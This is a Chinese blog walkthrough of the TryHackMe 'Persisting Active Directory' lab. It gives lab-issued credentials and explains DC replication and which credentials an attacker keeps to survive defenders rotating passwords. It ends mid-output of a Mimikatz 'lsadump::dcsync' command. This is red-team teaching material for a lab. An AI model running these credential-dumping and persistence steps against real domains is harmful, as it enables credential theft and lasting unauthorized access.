
<!DOCTYPE html><html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
  
  <meta name="generator" content="Hexo 7.2.0">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
  
  <title>THM-Persisting Active Directory - hybcx's blog</title>

  
    <meta name="description" content="0x01 简介 该网络是 Breaching AD、Enumerate AD 和 Exploiting AD 网络的延续。请确保先完成这些网络，然后再继续此操作。另请注意，我们将广泛讨论 AD 对象。如果您需要复习一下，请快速浏览一下这个房间。现在我们已经利用了 AD 并取得了一些可以执行我们目标的位置，我们需要确保我们部署持久性以确保蓝队不能直接把我们踢出去。在此网络中，我们将探索可用于在 AD">
<meta property="og:type" content="article">
<meta property="og:title" content="THM-Persisting Active Directory">
<meta property="og:url" content="http://hybcx.xyz/2024/02/19/thm-persisting-active-directory/index.html">
<meta property="og:site_name" content="hybcx&#39;s blog">
<meta property="og:description" content="0x01 简介 该网络是 Breaching AD、Enumerate AD 和 Exploiting AD 网络的延续。请确保先完成这些网络，然后再继续此操作。另请注意，我们将广泛讨论 AD 对象。如果您需要复习一下，请快速浏览一下这个房间。现在我们已经利用了 AD 并取得了一些可以执行我们目标的位置，我们需要确保我们部署持久性以确保蓝队不能直接把我们踢出去。在此网络中，我们将探索可用于在 AD">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240225161004725.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240225173127135.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240225174655287.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240225174648043.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226163153951.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226164724770.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226164909614.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226165532727.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226165555756.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226170201849.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226170443201.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226172020599.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226172601555.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226175500376.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226194150775.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226194157209.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226194610334.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240229185632633.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240229185428443.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240301083646807.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240301083942800.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240301084952802.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240301092532408.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303085356250.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303085559829.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303090321147.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303090415276.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303090554301.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303091224810.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303091534622.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303091608104.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303094231829.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303094248960.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303094310594.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303093752885.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303095504713.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303100320547.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101446479.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101530917.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101547299.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101614593.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101733170.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101743806.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101913295.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101921745.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101927186.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101951710.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303102110784.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303102201228.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303102210857.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303102217909.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303102231566.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303102628989.png">
<meta property="article:published_time" content="2024-02-19T08:44:35.051Z">
<meta property="article:modified_time" content="2024-06-09T07:30:24.441Z">
<meta property="article:author" content="hybcx">
<meta property="article:tag" content="TryHackMe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240225161004725.png">
  
  
  
  <meta name="keywords" content="TryHackMe">

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/main.css?v=1.28.1">

  
    <link rel="shortcut icon" href="/medias/logo.png">
  

  
    
<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">

  

  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>
<body>

<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 何必忧虑未来！</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>


<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
</div>
<div class="widgets">


<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/07/10/thm-hong-dui-zhen-cha/"><span class="title">THM-红队侦察</span></a><a class="item title" href="/2024/07/10/thm-c2-jian-jie/"><span class="title">THM-C2简介</span></a><a class="item title" href="/2024/07/09/thm-hong-dui-opsec/"><span class="title">THM-红队 OPSEC</span></a><a class="item title" href="/2024/07/09/thm-hong-dui-wei-xie-intel/"><span class="title">THM-红队威胁Intel</span></a><a class="item title" href="/2024/07/09/thm-hong-dui-ji-chu/"><span class="title">THM-红队基础</span></a><a class="item title" href="/2024/03/29/thm-jin-gong-xing-shen-tou-ce-shi/"><span class="title">THM-进攻性渗透测试</span></a><a class="item title" href="/2024/06/29/xuan-ji-ying-ji-xiang-ying-ba-chang/"><span class="title">玄机应急响应靶场</span></a><a class="item title" href="/2024/06/15/du-web-gong-fang-you-gan/"><span class="title">读web攻防有感</span></a><a class="item title" href="/2024/06/17/thm-corp/"><span class="title">THM-Corp</span></a><a class="item title" href="/2024/06/16/thm-hacking-with-powershell/"><span class="title">THM-Hacking_With_PowerShell</span></a></div></widget>
</div>
<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
</div></aside><div class="l_main" id="main">





<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/TryHackMe/">TryHackMe</a></div>
<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-02-19T08:44:35.051Z">2024-02-19</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-06-09T07:30:24.441Z">2024-06-09</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>THM-Persisting Active Directory</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content"><h1 id="0x01-简介">0x01 简介</h1>
<p>该网络是 Breaching AD、Enumerate AD 和 Exploiting AD 网络的延续。请确保先完成这些网络，然后再继续此操作。另请注意，我们将广泛讨论 AD 对象。如果您需要复习一下，请快速浏览一下这个房间。现在我们已经利用了 AD 并取得了一些可以执行我们目标的位置，我们需要确保我们部署持久性以确保蓝队不能直接把我们踢出去。在此网络中，我们将探索可用于在 AD 中持久化的几种不同方法。</p>
<h2 id="ad-维持">AD 维持</h2>
<p>在攻击 AD 的过程中，我们需要确保部署持久性。这将确保蓝队无法通过简单地轮换一些凭证来将我们踢出局。如前所述，AD 的破坏过程是循环的。当我们损害 AD 财产时，我们会部署持久性，而不仅仅是在最后。这确保了如果我们的一个位置被蓝队烧毁，我们有几个后备方案。在此持久阶段，我们将使用多种技术来确保我们获得的访问权限不会被简单地撤销。这些持久性技术取决于我们迄今为止获得的特定权限和特权。</p>
<h2 id="学习目标">学习目标</h2>
<p>在这个网络中，我们将介绍几种可用于在 AD 中持久化的方法。这绝不是一个完整的列表，因为可用的方法通常是高度情境化的，并且依赖于 AD 结构和环境。但是，我们将介绍以下持久 AD 技术：</p>
<ul>
<li>AD 凭据和 DCSync-ing</li>
<li>银票和金票</li>
<li>AD Certificates</li>
<li>AD 安全标识符 (SID)</li>
<li>Access Control Lists 访问控制列表</li>
<li>组策略对象 (GPO)</li>
</ul>
<h2 id="索取您的凭证">索取您的凭证</h2>
<p>为了模拟 AD 违规，您将获得第一组 AD 凭据。网络设置完成后，在攻击箱上导航至 <a target="_blank" rel="noopener" href="http://distributor.za.tryhackme.loc/creds">http://distributor.za.tryhackme.loc/creds</a> 以请求您的凭据对。单击“获取凭据”按钮以接收可用于初始访问的凭据对。</p>
<p>此凭据对将为您提供对 THMWRK1.za.tryhackme.loc 的 RDP 和 SSH 访问权限。 THMWRK1 可以被视为进入该环境的跳转主机，模拟您已实现的立足点。跳转主机经常成为红队的目标，因为它们提供对新网段的访问。您可以使用 Remmina 或任何其他类似的远程桌面客户端连接到该主机以进行 RDP。连接时记得指定za.tryhackme.loc的域名。</p>
<p>对于 SSH 访问，您可以使用以下 SSH 命令：</p>
<pre><code class="hljs scss">ssh za\\colin<span class="hljs-selector-class">.lane</span><span class="hljs-keyword">@thmwrk</span>1.za.tryhackme.loc
  // Your credentials have been <span class="hljs-attribute">generated</span>: <span class="hljs-attribute">Username</span>: colin.lane <span class="hljs-attribute">Password</span>: Arrangement2012</code></pre>
<p>出现提示时，提供您帐户的关联密码。尽管 RDP 可用于所有任务，但 SSH 速度更快。</p>
<h1 id="0x02-通过凭证进行持久化">0x02 通过凭证进行持久化</h1>
<h2 id="恭喜你">恭喜你</h2>
<p>恭喜疲惫的旅行者！在突破 AD、执行枚举并一路利用它到顶部（如果你按顺序完成了这些 AD 网络）之后，你终于到达了持久性的酒馆。艰苦的工作已经结束，现在是时候享受一些乐趣了。虽然 AD 持久性仍然是一件严肃的事情，但它确实不像其他阶段那么有压力。在这里我们可以尽情发挥我们的创造力。所以，在我们的小酒馆里休息一下您疲惫的骨头，给自己泡一杯好茶，然后我们就开始吧。</p>
<p>连同您的低特权凭据，您将获得域管理员凭据。多么幸运啊！在讨论持久性技术时，您将使用特权凭据对低特权凭据集执行持久性技术。记下以下 DA 帐户：</p>
<pre><code class="hljs scss">Username: `Administrator` 用户名： `Administrator`

Password: `tryhackmewouldnotguess1@` 密码： `tryhackmewouldnotguess1@`

Domain: `ZA` 域： `ZA`</code></pre>
<p>由于我们为您提供对整个域的完全访问权限，因此我们无法真正隐藏任何标志或强迫您确保在回答问题之前自己执行这些持久性技术。不过，我们鼓励您花时间尝试这些方法，因为当蓝队开始将您踢出局时，它们将作为红队评估的回报。</p>
<p>我们将讨论的第一个也是最不可靠的持久性技术是凭证。前面讨论的一些横向技术可能会导致攻击者获得凭证的访问权限。当使用“凭据”一词时，它可能意味着用户名和密码对，但在 AD 上下文中，即使是密码哈希也足以通过哈希传递技术进行身份验证。</p>
<h2 id="dc-sync同步">DC Sync（同步）</h2>
<p>在大型组织中，每个域只有一个域控制器是不够的。这些域通常在多个区域位置使用，并且拥有单个 DC 会显着延迟 AD 中的任何身份验证服务。因此，这些组织使用多个 DC。那么问题就变成了，您如何在两个不同的办公室使用相同的凭据进行身份验证？</p>
<p>这个问题的答案是域复制。每个域控制器都运行一个称为知识一致性检查器 (KCC) 的进程。 KCC为AD林生成复制拓扑，并通过远程过程调用（RPC）自动连接到其他域控制器以同步信息。这包括更新的信息，例如用户的新密码和新对象，例如创建新用户的时间。这就是为什么您在更改密码后通常必须等待几分钟才能进行身份验证，因为发生密码更改的 DC 可能与您进行身份验证的 DC 不同。</p>
<p>复制过程称为 DC 同步。不仅仅是 DC 可以启动复制。属于域管理员组的帐户也可以出于合法目的（例如创建新的域控制器）执行此操作。</p>
<p>一种流行的攻击是 DC 同步攻击。如果我们有权访问具有域复制权限的帐户，我们可以发起 DC 同步攻击以从 DC 获取凭据。</p>
<h2 id="并非所有凭证都是一样的">并非所有凭证都是一样的</h2>
<p>在开始 DC 同步攻击之前，我们首先讨论一下我们可能会寻找哪些凭据。虽然我们应该始终寻求转储特权凭据，例如域管理员组成员的凭据，但这些也是首先要轮换的凭据（蓝队术语，意思是重置帐户密码）。因此，如果我们只有特权凭证，可以肯定地说，一旦蓝队发现我们，他们就会轮换这些帐户，我们可能会失去访问权限。</p>
<p>那么我们的目标就是坚持拥有接近特权的凭证。我们并不总是需要王国的完整钥匙；我们只需要足够的钥匙来确保我们仍然能够实现目标执行并始终让蓝队保持警惕。因此，我们应该尝试通过如下凭证来持久保存：</p>
<ul>
<li>在多台计算机上具有本地管理员权限的凭据。通常，组织有一两个对几乎所有计算机具有本地管理权限的组。这些组通常分为一组用于工作站，一组用于服务器。通过获取这些团体成员的凭据，我们仍然可以访问该庄园中的大部具有委派权限的服务帐户。有了这些账户，我们就能够强制金票和银票执行 Kerberos 委托攻击。</li>
<li>用于特权 AD 服务的帐户。如果我们泄露了特权服务（例如 Exchange、Windows Server Update Services (WSUS) 或 System Center Configuration Manager (SCCM)）的帐户，我们可以利用 AD 漏洞再次获得特权立足点。</li>
</ul>
<p>当谈到要转储和保留哪些凭证时，它受到很多因素的影响。您必须发挥创意并根据具体情况进行思考。然而，对于这个房间，我们将享受一些乐趣，让蓝队流汗，并放弃我们能得到的每一份凭证！</p>
<h2 id="dc同步全部">DC同步全部</h2>
<p>我们将使用 Mimikatz 来获取凭证。使用 DA 帐户通过 SSH 登录 THMWRK1 并加载 Mimikatz：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240225161004725.png" alt="image-20240225161004725"></p>
<p>让我们首先对我们自己的单个帐户执行 DC 同步：</p>
<pre><code class="hljs scss">mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /user:louis.cole 
[DC] <span class="hljs-string">'za.tryhackme.loc'</span> will be the domain 
[DC] <span class="hljs-string">'THMDC.za.tryhackme.loc'</span> will be the DC server 
[DC] <span class="hljs-string">'louis.cole'</span> will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (<span class="hljs-number">9</span>) 

Object RDN           : louis.cole 

** SAM ACCOUNT **

SAM Username         : louis.cole
